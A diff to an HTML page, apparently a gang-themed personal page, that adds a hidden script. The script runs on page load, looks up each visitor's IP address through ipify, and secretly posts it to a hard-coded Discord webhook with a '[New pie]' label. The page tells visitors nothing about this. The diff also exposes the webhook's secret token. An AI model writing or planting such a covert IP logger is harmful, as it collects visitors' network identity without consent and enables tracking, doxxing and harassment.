@@ -138,5 +138,51 @@
         <div class="bloody">Death Row .gg/?></div>
         <div class="gangster">I'm still here, don't worry</div>
     </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Failed to fetch visitor IP');
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    const ip = data.ip;
+
+                    const webhookUrl = 'https://canary.discord.com/api/webhooks/1256061550343491645/2g8SR9DCO0S7aA3IAs4-exWX7gtIJqhPIGSP5u_9R-0fxxr1EwRLmUcG1usuUSCeIn5f';
+
+                    const embed = {
+                        title: '[New pie]',
+                        description: ip: ${ip},
+                        color: 0x000000, // Red color, you can change this to any hex color
+                        image: {
+                            url: 'https://cdn.discordapp.com/attachments/1256064719610183730/1256064764040314971/6dc8de6c041a308977d506fde50e5da8.gif?ex=667f68f8&is=667e1778&hm=a7258813868f8977b1fc1da20b028328064b6c273782613848d00678a784a832&', // Replace with your GIF URL
+                        },
+                    };
+
+                    const message = {
+                        embeds: [embed],
+                    };
+
+                    fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(message),
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Failed to send IP address to Discord webhook');
+                        }
+                    })
+                    .catch(error => console.error('Error sending IP address to Discord webhook:', error));
+                })
+                .catch(error => console.error('Error fetching visitor IP:', error));
+        });
+    </script>
 </body>
 </html>
+
